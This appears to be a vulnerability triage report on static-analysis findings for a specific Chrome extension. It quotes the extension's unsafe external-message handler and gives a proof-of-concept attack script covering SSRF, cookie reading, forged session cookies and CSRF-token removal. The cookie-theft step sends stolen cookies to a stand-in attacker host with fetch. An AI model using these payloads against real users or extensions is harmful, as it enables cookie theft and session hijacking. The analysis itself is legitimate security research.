# CoCo Analysis: gfefaehopggffjmpodfdplcjkjbmlpnc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 42 (multiple vulnerabilities including SSRF, cookie manipulation, and information disclosure)

---

## Sink 1: bg_chrome_runtime_MessageExternal → jQuery_ajax_settings_url_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gfefaehopggffjmpodfdplcjkjbmlpnc/opgen_generated_files/bg.js
Line 967: _ajax(request.params, function (result, status, xhr) {
Line 1072: url: params.url,
```

**Code:**

```javascript
// Background script (bg.js)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.method == "ajax") {
        _ajax(request.params, function (result, status, xhr) { // ← attacker-controlled params
            sendResponse(result); // ← sends response back to attacker
        }, function (xhr, errorType, error) {
            sendResponse({message: errorType});
        });
    } else if (request.method == "getCookies") {
        chrome.cookies.getAll(request.params, function (cookies) {
            sendResponse(cookies); // ← leaks cookies
        });
    } else if (request.method == "getCookiesStores") {
        chrome.cookies.getAllCookieStores(function (cookieStores) {
            sendResponse(cookieStores); // ← leaks cookie stores
        });
    } else if (request.method == "setCookie") {
        chrome.cookies.set(request.params, function (cookie) { // ← attacker can set cookies
            sendResponse(cookie);
        });
    } else if (request.method == "removeCookies") {
        chrome.cookies.remove(request.params, function (params) { // ← attacker can remove cookies
            sendResponse(params);
        })
    }
    return true;
});

function _ajax(params, onok, onerr) {
    onok = onok || function(){};
    onerr = onerr || function(){};
    var ajaxParam = {
        url: params.url, // ← attacker-controlled URL
        type: params.type, // ← attacker-controlled HTTP method
        data: params.data, // ← attacker-controlled data
        async: params.async,
        dataType: params.dataType,
        contentType: params.contentType,
        xhrFields: params.xhrFields,
        success: function (result, status, xhr) {
            onok(result, status, xhr);
        },
        error: function (xhr, errorType, error) {
            onerr(xhr, errorType, error);
        }
    };
    if (params.timeout) {
        ajaxParam.timeout = params.timeout;
    }
    return $.ajax(ajaxParam); // ← privileged cross-origin request
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal - External website messaging

**Attack:**

```javascript
// From any page on *.aliexpress.com or yf.aezhushou.com:

// 1. SSRF - Make privileged cross-origin request
chrome.runtime.sendMessage(
    "gfefaehopggffjmpodfdplcjkjbmlpnc",
    {
        method: "ajax",
        params: {
            url: "https://internal-api.company.com/admin/delete-user",
            type: "POST",
            data: {userId: 123},
            dataType: "json"
        }
    },
    function(response) {
        console.log("SSRF response:", response);
    }
);

// 2. Cookie theft - Read all cookies from any domain
chrome.runtime.sendMessage(
    "gfefaehopggffjmpodfdplcjkjbmlpnc",
    {
        method: "getCookies",
        params: {domain: ".aliexpress.com"}
    },
    function(cookies) {
        console.log("Stolen cookies:", cookies);
        // Exfiltrate to attacker server
        fetch("https://attacker.com/collect", {
            method: "POST",
            body: JSON.stringify(cookies)
        });
    }
);

// 3. Cookie manipulation - Set malicious cookies
chrome.runtime.sendMessage(
    "gfefaehopggffjmpodfdplcjkjbmlpnc",
    {
        method: "setCookie",
        params: {
            url: "https://aliexpress.com",
            name: "session_token",
            value: "attacker_controlled_value",
            domain: ".aliexpress.com"
        }
    }
);

// 4. Cookie removal - Remove security cookies
chrome.runtime.sendMessage(
    "gfefaehopggffjmpodfdplcjkjbmlpnc",
    {
        method: "removeCookies",
        params: {
            url: "https://aliexpress.com",
            name: "XSRF-TOKEN"
        }
    }
);
```

**Impact:** This extension has severe security vulnerabilities:

1. **SSRF (Server-Side Request Forgery)**: Attackers can make privileged cross-origin requests to any URL with arbitrary HTTP methods and data. This bypasses CORS protections and can be used to attack internal networks, APIs, or perform actions on behalf of the user.

2. **Cookie Theft**: Attackers can read all cookies from any domain (including authentication tokens, session IDs), leading to account takeover and data exfiltration.

3. **Cookie Manipulation**: Attackers can set arbitrary cookies on any domain, potentially hijacking sessions or bypassing security controls.

4. **Cookie Removal**: Attackers can remove security cookies like CSRF tokens, enabling further attacks.

The extension is accessible from *.aliexpress.com and yf.aezhushou.com domains, so any XSS or malicious content on these domains (or subdomains) can exploit these vulnerabilities.

---

**Note:** CoCo detected 42 separate flows including:
- 2 flows for SSRF (url and data parameters)
- Multiple flows for cookie/cookieStore information disclosure (various cookie fields)
- Multiple flows for cookie manipulation (set/remove operations with various parameters)

All represent TRUE POSITIVE vulnerabilities stemming from the insecure `onMessageExternal` handler that exposes powerful APIs without proper validation.
